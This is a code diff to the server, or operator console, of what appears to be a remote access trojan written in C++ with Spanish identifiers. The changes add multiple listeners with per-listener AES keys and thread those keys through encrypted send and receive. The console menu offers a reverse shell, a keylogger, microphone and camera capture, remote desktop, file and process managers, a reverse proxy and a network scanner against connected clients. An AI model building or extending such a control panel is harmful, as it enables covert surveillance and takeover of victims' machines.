@@ -97,7 +97,7 @@ void Cliente_Handler::Command_Handler(){
             break;
         }
         
-        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, 0, true, &error_code);
+        iTempRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, 0, true, &error_code, this->p_Cliente.c_key);
         this->SetBytesRecibidos(iTempRecibido);
         
         //timeout / nonblock
@@ -197,6 +197,7 @@ void Cliente_Handler::Process_Command(const Paquete_Queue& paquete) {
         structTmp._strCpu = this->p_Cliente._strCpu = vcDatos[3];
         structTmp._id = this->p_Cliente._id;
         structTmp._strIp = this->p_Cliente._strIp;
+        structTmp._strListener = this->p_Cliente._strListener;
         this->p_Cliente._strRAM = vcDatos[4];
         this->p_Cliente._strIPS = vcDatos[5];
 
@@ -788,8 +789,52 @@ void Servidor::Init_Key() {
     }
 }
 
+bool Servidor::Init_Socket(SOCKET& _socket, u_int _puerto, struct sockaddr_in& _struct_listener){
+    
+    _socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+    if (!_socket) {
+        ERROR_EW("[Servidor::Init_Socket] No se pudo iniciar el socket");
+        return false;
+    }
+
+    int iTemp = 1;
+    if (setsockopt(_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&iTemp, sizeof(iTemp)) < 0) {
+        ERROR_EW("[Servidor::Init_Socket] Error configurando el socket SO_REUSEADDR");
+        return false;
+    }
+
+    unsigned long int iBlock = 1;
+    if (ioctlsocket(_socket, FIONBIO, &iBlock) != 0) {
+        ERROR_EW("[Servidor::Init_Socket] Error configurando el socket NON_BLOCK");
+        return false;
+    }
+
+    _struct_listener.sin_family = AF_INET;
+    _struct_listener.sin_port = htons(_puerto);
+    _struct_listener.sin_addr.s_addr = INADDR_ANY;
+
+    if (bind(_socket, (struct sockaddr*)&_struct_listener, sizeof(struct sockaddr)) == -1) {
+        ERROR_EW("[Servidor::Init_Socket] Error configurando el socket BIND");
+        return false;
+    }
+
+    return true;
+}
+
+void Servidor::Init_Listen(SOCKET& _socket) {
+    if (_socket != INVALID_SOCKET) {
+        if (listen(_socket, 10) == -1) {
+            ERROR_EW("[Servidor::Init_Listen] Error configurando el socket LISTEN");
+            
+        }
+    }
+}
+
 Servidor::Servidor(){
-    this->uiPuertoLocal = 65500;
+    WSACleanup();
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        ERROR_EW("[WSAStartup] Servidor::Servidor");
+    }
 
     //clase para logear
     this->m_txtLog = DBG_NEW MyLogClass();
@@ -797,14 +842,13 @@ Servidor::Servidor(){
     this->Init_Key();
 
     this->modRerverseProxy = new ReverseProxy();
-
 }
 
 bool Servidor::m_Iniciar(){
-    WSACleanup();
-    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
-        return false;
-    }
+   
+
+    //TESTING
+  /*  return true;
 
     this->sckSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     if(!this->sckSocket){
@@ -836,16 +880,16 @@ bool Servidor::m_Iniciar(){
     if(listen(this->sckSocket, 10) == -1){
         this->m_txtLog->LogThis("Error configurando el socket LISTEN", LogType::LogError);
         return false;
-    }
+    }*/
 
     return true;
 }
 
-ClientConInfo Servidor::m_Aceptar(){
+ClientConInfo Servidor::m_Aceptar(SOCKET& _socket){
     struct ClientConInfo structNuevo;
     struct sockaddr_in structCliente;
     int iTempC = sizeof(struct sockaddr_in);
-    SOCKET tmpSck = accept(this->sckSocket, (struct sockaddr *)&structCliente, &iTempC) ;
+    SOCKET tmpSck = accept(_socket, (struct sockaddr *)&structCliente, &iTempC) ;
     if(tmpSck != INVALID_SOCKET){
         char strIP[INET_ADDRSTRLEN];
         inet_ntop(AF_INET, &(structCliente.sin_addr), strIP, INET_ADDRSTRLEN);
@@ -906,8 +950,104 @@ void Servidor::m_CerrarConexion(SOCKET pSocket) {
     }
 }
 
+void Servidor::m_AgregarListener(const std::string _nuevo_nombre, int _puerto, const char* _con_key) {
+    std::unique_lock<std::mutex> lock(this->mtx_listeners);
+    
+    Servidor_Listener nuevo_listener;
+    nuevo_listener.sckSocket = INVALID_SOCKET;
+    nuevo_listener.strNombre = _nuevo_nombre;
+    nuevo_listener.isRunning = false;
+    nuevo_listener.iPuerto = _puerto;
+    memset(nuevo_listener.con_key, 0, AES_KEY_LEN+1);
+
+    strncpy(nuevo_listener.con_key, _con_key, AES_KEY_LEN);
+    this->vc_Listeners.push_back(nuevo_listener);
+}
+
+void Servidor::m_BorrarListener(const std::string _nombre_listener) {
+    //Remover listener del FD_SET maestro y cerrar conexiones activas
+
+    std::unique_lock<std::mutex> lock(this->mtx_listeners);
+    std::vector<Servidor_Listener>::iterator ntemp = this->vc_Listeners.begin();
+    for (; ntemp != this->vc_Listeners.end(); ntemp++) {
+        if(ntemp->strNombre == _nombre_listener) {
+            //Cerrar socket, terminar conexiones???
+            if (ntemp->sckSocket != INVALID_SOCKET) {
+                closesocket(ntemp->sckSocket);
+                ntemp->sckSocket = INVALID_SOCKET;
+            }
+
+            this->vc_Listeners.erase(ntemp);
+            break;
+        }
+    }
+}
+
+void Servidor::m_ToggleListener(const std::string _nombre_listener) {
+    std::unique_lock<std::mutex> lock(this->mtx_listeners);
+    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
+        if (this->vc_Listeners[i].strNombre == _nombre_listener) {
+            //Cambiar estado del listener
+            if (this->vc_Listeners[i].isRunning) {
+                closesocket(this->vc_Listeners[i].sckSocket);
+                this->vc_Listeners[i].sckSocket = INVALID_SOCKET;
+                this->vc_Listeners[i].isRunning = false;
+            }else {
+                if (!this->Init_Socket(this->vc_Listeners[i].sckSocket, this->vc_Listeners[i].iPuerto, this->vc_Listeners[i].struct_Listener)) {
+                    DEBUG_MSG("[Servidor::m_ToggleListener] No se pudo iniciar el listener " + this->vc_Listeners[i].strNombre);
+                }else {
+                    this->vc_Listeners[i].isRunning = true;
+                    if (this->m_Running()) {
+                        this->Init_Listen(this->vc_Listeners[i].sckSocket);
+                    }
+                }
+            }
+            break;
+        }
+    }
+}
+
+Servidor_Listener Servidor::m_ObtenerListener(SOCKET& _socket) {
+    std::unique_lock<std::mutex> lock(this->mtx_listeners);
+    Servidor_Listener nTemp;
+    for (Servidor_Listener& listener : this->vc_Listeners) {
+        if (listener.sckSocket == _socket) {
+            nTemp = listener;
+            break;
+        }
+    }
+    return nTemp;
+}
+
+fd_set Servidor::m_CopiaFD() {
+    std::unique_lock<std::mutex> lock(this->mtx_listeners);
+    fd_set temp_fd;
+    FD_ZERO(&temp_fd);
+    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
+        if (this->vc_Listeners[i].isRunning) {
+            FD_SET(this->vc_Listeners[i].sckSocket, &temp_fd);
+        }
+    }
+    return temp_fd;
+}
+
+std::vector<Listener_List_Data> Servidor::m_ListenerVectorCopy() {
+    std::unique_lock<std::mutex> lock(this->mtx_listeners);
+    std::vector<Listener_List_Data> vcOut;
+    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
+        Listener_List_Data ntemp;
+        ntemp.nombre = this->vc_Listeners[i].strNombre;
+        ntemp.clave_acceso = this->vc_Listeners[i].con_key;
+        ntemp.puerto = std::to_string(this->vc_Listeners[i].iPuerto);
+        ntemp.estado = this->vc_Listeners[i].isRunning ? "Habilitado" : "Deshabilitado";
+        vcOut.push_back(ntemp);
+    }
+
+    return vcOut;
+}
+
 void Servidor::m_CerrarConexiones() {
-    std::unique_lock<std::mutex> lock(vector_mutex); //<------------------------------- DBG_NEW
+    std::unique_lock<std::mutex> lock(vector_mutex);
     if (this->vc_Clientes.size() > 0) {
         for(int iIndex = 0; iIndex<int(this->vc_Clientes.size()); iIndex++){
             this->m_CerrarConexion(this->vc_Clientes[iIndex]->p_Cliente._sckCliente);
@@ -964,58 +1104,102 @@ void Servidor::m_Escucha(){
     struct timeval timeout;
     timeout.tv_sec = 1;
     timeout.tv_usec = 0;
-    
-    fd_set fdMaster;
-    FD_ZERO(&fdMaster);
-    FD_SET(this->sckSocket, &fdMaster);
+
+    //Iniciar listen en todos los que esten habilitados
+    std::unique_lock<std::mutex> lock(this->mtx_listeners);
+    for (size_t i = 0; i < this->vc_Listeners.size(); i++) {
+        if (this->vc_Listeners[i].isRunning) {
+            this->Init_Listen(this->vc_Listeners[i].sckSocket);
+        }
+    }
+    lock.unlock();
+
     
     while(this->m_Running()){
-        fd_set fdMaster_copy = fdMaster;
+        fd_set fdMaster_copy = this->m_CopiaFD();  // Se obtiene lista de sockets que estan corriendo
+        SOCKET tempSocket = INVALID_SOCKET;
+        if (fdMaster_copy.fd_count <= 0) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(500));
+            continue;
+        }else {
+            tempSocket = fdMaster_copy.fd_array[fdMaster_copy.fd_count - 1];
+        }
         
-        int iNumeroSockets = select(this->sckSocket + 1, &fdMaster_copy, nullptr, nullptr, &timeout);
+        int iNumeroSockets = select(tempSocket +1, &fdMaster_copy, nullptr, nullptr, &timeout);
         for (int iCont = 0; iCont < iNumeroSockets; iCont++) {
             SOCKET iSock = fdMaster_copy.fd_array[iCont];
 
-            if (iSock == this->sckSocket) {
-                //Nueva conexion
-                struct ClientConInfo sckNuevoCliente = this->m_Aceptar();
-                if (sckNuevoCliente._sckSocket == INVALID_SOCKET) {
-                    //socket invalido
-                    continue;
-                }
-                //IP:PUERTO
-                std::string strtmpIP = sckNuevoCliente._strIp;
-                strtmpIP.append(1, ':');
-                strtmpIP.append(sckNuevoCliente._strPuerto);
+            DEBUG_MSG("[NUEVA CONEXION]...");
 
-                //RANDOM ID
-                std::string strTmpId = RandomID(7);
-                strTmpId.append(1, '-');
-                strTmpId += std::to_string(sckNuevoCliente._sckSocket);
-
-                struct Cliente structNuevoCliente;
-                structNuevoCliente._sckCliente = sckNuevoCliente._sckSocket;
-                structNuevoCliente._ttUltimaVez = time(0);
-                structNuevoCliente._id = strTmpId;
-                structNuevoCliente._strIp = strtmpIP;
-
-                std::string strTest = strtmpIP;
-                std::string strTitle = "["+strTmpId+"] Nueva conexion";
-                
-                wxTheApp->CallAfter([strTest, strTitle] {
-                    std::shared_ptr<MyNotify> n_notify = MyNotify::Create(nullptr, strTitle, strTest, 5);
-                });
-                
-                //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
-                std::unique_lock<std::mutex> lock(vector_mutex);
-                this->vc_Clientes.push_back(DBG_NEW Cliente_Handler(structNuevoCliente));
-                this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Threads();
-                
-                this->m_InsertMutex(sckNuevoCliente._sckSocket);
+            //Nueva conexion
+            struct ClientConInfo sckNuevoCliente = this->m_Aceptar(iSock);
+            if (sckNuevoCliente._sckSocket == INVALID_SOCKET) {
+                //socket invalido
+                continue;
             }
+
+            //Verificar si hay llave de cifrado para cliente
+            Servidor_Listener nTemp = this->m_ObtenerListener(iSock);
+
+            if (nTemp.strNombre == "") {
+                DEBUG_MSG("[Servidor::m_Escucha] Error leyendo la key de los listeners o no existe");
+                closesocket(sckNuevoCliente._sckSocket);
+                sckNuevoCliente._sckSocket = INVALID_SOCKET;
+                continue;
+            }
+
+            DEBUG_MSG("[Servidor::m_Escucha] Nueva conexion, listener: " + nTemp.strNombre);
+
+            //IP:PUERTO
+            std::string strtmpIP = sckNuevoCliente._strIp;
+            strtmpIP.append(1, ':');
+            strtmpIP.append(sckNuevoCliente._strPuerto);
+
+            //RANDOM ID
+            std::string strTmpId = RandomID(7);
+            strTmpId.append(1, '-');
+            strTmpId += std::to_string(sckNuevoCliente._sckSocket);
+
+            struct Cliente structNuevoCliente;
+            structNuevoCliente._sckCliente = sckNuevoCliente._sckSocket;
+            structNuevoCliente._ttUltimaVez = time(0);
+            structNuevoCliente._id = strTmpId;
+            structNuevoCliente._strIp = strtmpIP;
+            structNuevoCliente._strListener = nTemp.strNombre;
+
+            //COPIAR LLAVE DE CIFRADO
+            for (unsigned char i = 0; i < AES_KEY_LEN; i++) {
+                structNuevoCliente.c_key.push_back(nTemp.con_key[i]);
+            }
+
+            //strncpy_s(structNuevoCliente.c_key, AES_KEY_LEN, nTemp.con_key, AES_KEY_LEN);
+
+            std::string strTest = strtmpIP;
+            std::string strTitle = "["+strTmpId+"] Nueva conexion";
+                
+            wxTheApp->CallAfter([strTest, strTitle] {
+                std::shared_ptr<MyNotify> n_notify = MyNotify::Create(nullptr, strTitle, strTest, 5);
+            });
+                
+            //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
+            std::unique_lock<std::mutex> lock(vector_mutex);
+            this->vc_Clientes.push_back(DBG_NEW Cliente_Handler(structNuevoCliente));
+            this->vc_Clientes[this->vc_Clientes.size() - 1]->Spawn_Threads();
+                
+            this->m_InsertMutex(sckNuevoCliente._sckSocket);
 
         }
     }
+
+    //Cerrar todos los listener
+    std::unique_lock<std::mutex> lock2(this->mtx_listeners);
+    for (Servidor_Listener& listener : this->vc_Listeners) {
+        if (listener.sckSocket != INVALID_SOCKET) {
+            closesocket(listener.sckSocket);
+            listener.sckSocket = INVALID_SOCKET;
+        }
+    }
+
     DEBUG_MSG("DONE Listen");
 }
 
@@ -1042,11 +1226,12 @@ void Servidor::m_InsertarCliente(struct Cliente& p_Cliente){
     int iIndex = this->m_listCtrl->GetItemCount();
 
     this->m_listCtrl->InsertItem(iIndex, wxString(p_Cliente._id));
-    this->m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strUser));
-    this->m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strIp));
-    this->m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strSo));
-    this->m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strPID));
-    this->m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strCpu));
+    this->m_listCtrl->SetItem(iIndex, 1, wxString(p_Cliente._strListener));
+    this->m_listCtrl->SetItem(iIndex, 2, wxString(p_Cliente._strUser));
+    this->m_listCtrl->SetItem(iIndex, 3, wxString(p_Cliente._strIp));
+    this->m_listCtrl->SetItem(iIndex, 4, wxString(p_Cliente._strSo));
+    this->m_listCtrl->SetItem(iIndex, 5, wxString(p_Cliente._strPID));
+    this->m_listCtrl->SetItem(iIndex, 6, wxString(p_Cliente._strCpu));
 }
 
 void Servidor::m_RemoverClienteLista(std::string p_ID){
@@ -1061,7 +1246,7 @@ void Servidor::m_RemoverClienteLista(std::string p_ID){
     
 }
 
-int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete) {
+int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, int iTipoPaquete, ByteArray& c_key) {
     //Aqui hacer loop para enviar por partes el buffer
     int iEnviado      =    0;
     int iRestante     =    0;
@@ -1109,7 +1294,7 @@ int Servidor::cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFl
 
             this->m_SerializarPaquete(nPaquete, cPaqueteSer);
 
-            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, ntemp_mutex, isBlock, 0);
+            iChunkEnviado = this->cSend(pSocket, cPaqueteSer, iFinalSize, pFlags, ntemp_mutex, isBlock, 0, c_key);
             if (iChunkEnviado == SOCKET_ERROR || iChunkEnviado == WSAECONNRESET) {
                 DEBUG_MSG("[CHUNK] Error enviando el chunk");
                 return iChunkEnviado;
@@ -1152,7 +1337,7 @@ int Servidor::send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlag
     return iTotalEnviado;
 }
 
-int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, std::mutex*& mtx_obj, bool isBlock, int iTipoPaquete) {
+int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, std::mutex*& mtx_obj, bool isBlock, int iTipoPaquete, ByteArray& c_key) {
     // 1 non block
     // 0 block
     std::mutex* tmp_mutex;
@@ -1167,7 +1352,7 @@ int Servidor::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, 
     int iDataSize = pLen;
 
     //Vector que aloja el buffer cifrado
-    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize);
+    ByteArray cData = this->bEnc(reinterpret_cast<const unsigned char*>(pBuffer), iDataSize, c_key);
     iDataSize = cData.size();
     if (iDataSize == 0) {
         ERROR_EW("Error encriptando los datos a enviar");
@@ -1232,7 +1417,7 @@ int Servidor::recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags) {
     return iTotalRecibido;
 }
 
-int Servidor::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* error_code) {
+int Servidor::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* error_code, ByteArray& c_key) {
     
     // 1 non block
     // 0 block
@@ -1290,10 +1475,10 @@ int Servidor::cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, boo
     }
 
     //Decrypt
-    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido);
+    ByteArray bOut = this->bDec(reinterpret_cast<const unsigned char*>(cRecvBuffer.data()), iRecibido, c_key);
     iRecibido = bOut.size();
     if (iRecibido == 0) {
-        ERROR_EW("Error desencriptando los datos a enviar");
+        ERROR_EW("[cRecv] Error desencriptando los datos recibidos");
         return 0;
     }
 
@@ -1356,21 +1541,23 @@ void Servidor::m_BorrarCliente(std::mutex& mtx, int iIndex, bool isEnd) {
 }
 
 //AES256
-ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen) {
+ByteArray Servidor::bEnc(const unsigned char* pInput, size_t pLen, ByteArray c_key) {
     ByteArray bOutput;
-    ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
+    //ByteArray::size_type enc_len = Aes256::encrypt(this->bKey, pInput, pLen, bOutput);
+    ByteArray::size_type enc_len = Aes256::encrypt(c_key, pInput, pLen, bOutput);
     if (enc_len <= 0) {
-        DEBUG_MSG("Error encriptando:");
+        DEBUG_MSG("[Servidor::bEnc] Error encriptando:");
         DEBUG_MSG(pInput);
     }
     return bOutput;
 }
 
-ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen) {
+ByteArray Servidor::bDec(const unsigned char* pInput, size_t pLen, ByteArray c_key) {
     ByteArray bOutput;
-    ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
+    //ByteArray::size_type dec_len = Aes256::decrypt(this->bKey, pInput, pLen, bOutput);
+    ByteArray::size_type dec_len = Aes256::decrypt(c_key, pInput, pLen, bOutput);
     if (dec_len <= 0) {
-        DEBUG_MSG("Error desencriptando:");
+        DEBUG_MSG("[Servidor::bEnc] Error desencriptando:");
         DEBUG_MSG(pInput);
     }
     return bOutput;
@@ -1615,10 +1802,6 @@ void MyListCtrl::OnContextMenu(wxContextMenuEvent& event){
 
         wxString st1 = this->GetItemText(iItem, 0);
         this->strTmp = st1;
-        /*this->strTmp.append(1, '/');
-        this->strTmp += this->GetItemText(iItem, 1);
-        this->strTmp.append(1, '/');
-        this->strTmp += this->GetItemText(iItem, 2);*/
 
         ShowContextMenu(point, iItem);
     }
@@ -1673,48 +1856,49 @@ void MyListCtrl::OnModMenu(wxCommandEvent& event) {
     const int menuID = event.GetId();
 
     SOCKET tmpSocket = p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._sckCliente;
+    ByteArray& c_key = p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente.c_key;
 
     if (menuID == EnumMenuMods::ID_OnShell) {
-        panelReverseShell* panelShell = new panelReverseShell(this, tmpSocket, this->strTmp.ToStdString());
+        panelReverseShell* panelShell = new panelReverseShell(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelShell->Show();
     } else if (menuID == EnumMenuMods::ID_OnMicrofono) {
-        panelMicrophone* panelMic = new panelMicrophone(this, tmpSocket, this->strTmp.ToStdString());
+        panelMicrophone* panelMic = new panelMicrophone(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelMic->Show();
     }else if (menuID == EnumMenuMods::ID_OnKeyloger) {
-        panelKeylogger* panelKey = new panelKeylogger(this, tmpSocket, this->strTmp.ToStdString());
+        panelKeylogger* panelKey = new panelKeylogger(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelKey->Show();
     }
     else if (menuID == EnumMenuMods::ID_OnCamara) {
-        panelCamara* panelCam = new panelCamara(this, tmpSocket, this->strTmp.ToStdString());
+        panelCamara* panelCam = new panelCamara(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelCam->Show();
     }else if (menuID == EnumMenuMods::ID_OnEscritorioRemoto) {
-        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, tmpSocket, this->strTmp.ToStdString());
+        frameRemoteDesktop* frameRemote = new frameRemoteDesktop(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         frameRemote->Show();
     }else if (menuID == EnumMenuMods::ID_OnAdminVentanas) {
-        panelWManager* panelWM = new panelWManager(this, tmpSocket, this->strTmp.ToStdString());
+        panelWManager* panelWM = new panelWManager(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelWM->Show();
     }else if (menuID == EnumMenuMods::ID_OnInfo) {
-        panelInformacion* panelINF = new panelInformacion(this, tmpSocket, this->strTmp.ToStdString());
+        panelInformacion* panelINF = new panelInformacion(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelINF->Show();
     }else if (menuID == EnumMenuMods::ID_OnEscanerRed) {
-        panelEscaner* panelSCAN = new panelEscaner(this, tmpSocket, this->strTmp.ToStdString());
+        panelEscaner* panelSCAN = new panelEscaner(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelSCAN->Show();
     }else if (menuID == EnumMenuMods::ID_OnBromas) {
-        panelFun* panelFUN = new panelFun(this, tmpSocket, this->strTmp.ToStdString());
+        panelFun* panelFUN = new panelFun(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelFUN->Show();
     }else if (menuID == EnumMenuMods::ID_OnAdminArchivos) {
-        panelFileManager* panelFM = new panelFileManager(this, tmpSocket, this->strTmp.ToStdString(), p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._strIp);
+        panelFileManager* panelFM = new panelFileManager(this, tmpSocket, this->strTmp.ToStdString(), p_Servidor->vc_Clientes[this->iClienteID]->p_Cliente._strIp, c_key);
         panelFM->Show();
     }else if (menuID == EnumMenuMods::ID_OnProxyInversa) {
-        panelReverseProxy* panelPROXY = new panelReverseProxy(this, tmpSocket, this->strTmp.ToStdString());
+        panelReverseProxy* panelPROXY = new panelReverseProxy(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelPROXY->Show();
     }else if (menuID == EnumMenuMods::ID_OnAdminProcesos) {
-        panelProcessManager* panelPM = new panelProcessManager(this, tmpSocket, this->strTmp.ToStdString());
+        panelProcessManager* panelPM = new panelProcessManager(this, tmpSocket, this->strTmp.ToStdString(), c_key);
         panelPM->Show();
     }
     //Comandos de cliente, cerrar, reiniciar, actualizar, desinstalar
     else if (menuID == EnumIDS::ID_CerrarProceso) {
-        p_Servidor->cChunkSend(tmpSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP);
+        p_Servidor->cChunkSend(tmpSocket, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_STOP, c_key);
         p_Servidor->m_CerrarConexion(tmpSocket);
     } 
 }
